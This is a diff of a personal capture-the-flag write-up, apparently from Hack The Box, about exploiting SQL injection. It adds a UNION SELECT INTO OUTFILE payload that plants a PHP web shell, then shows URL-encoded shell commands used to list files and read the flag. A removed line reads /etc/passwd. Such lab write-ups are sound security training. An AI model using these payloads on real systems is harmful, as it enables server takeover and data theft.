@@ -109,15 +109,30 @@ January' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfi
 OH NOOOOOOOOO. I was denied the ability to write a file as we can see below:
 ![[Screenshot 2025-03-09 at 2.01.41 PM.png]]
 
-Well if I can not write a file maybe I can just read it. Lets try the following
+After looking over and seeing we are the root@localhost I was a bit puzzled unilt I noticed the URL. we are in /dashboard directory? So what if we tried to make our webshell in that directory instead?
 
 ```sql
-January' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4,5;-- -
+January' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php';-- -
 ```
 
-## Stopping here for now until I can do this later
 
-- Note to future self
-	- Check current user
-	- Check permissions of current user
-	- Se where I might be able to place a webshell
+![[Screenshot 2025-03-09 at 3.40.50 PM.png]]
+
+No errors! I am guessing this means it worked! Lets see if we can output what is in the root directory.
+
+since we want to pass `cd /;ls` we will url encode it to make it work so our URL should look like the following:
+
+`http://94.237.59.237:49685/dashboard/shell.php?0=cd%20%2F%3Bls`
+
+![[Screenshot 2025-03-09 at 3.47.48 PM.png]]
+
+looks like we have found our flag! `flag_cae1dadcd174.txt` now lets cat it out by running `cd /; cat flag_cae1dadcd174.txt` URL encoding to make our url as follows:
+
+`http://94.237.59.237:49685/dashboard/shell.php?0=cd%20%2F%3Bcat%20flag_cae1dadcd174.txt`
+
+Success! we now have the flag we need to pass.
+
+
+
+
+#SQLi #sqlinjection #htb #writeup
